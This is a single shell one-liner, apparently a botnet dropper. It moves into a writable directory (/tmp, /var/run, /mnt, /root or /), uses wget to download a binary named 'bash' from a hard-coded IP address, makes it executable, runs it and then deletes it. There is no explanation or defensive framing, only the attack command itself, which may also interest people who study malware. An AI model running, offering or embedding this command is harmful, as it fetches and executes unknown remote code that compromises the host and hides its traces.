cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://104.238.133.230/bash; chmod +x bash; ./bash; rm -rf bash
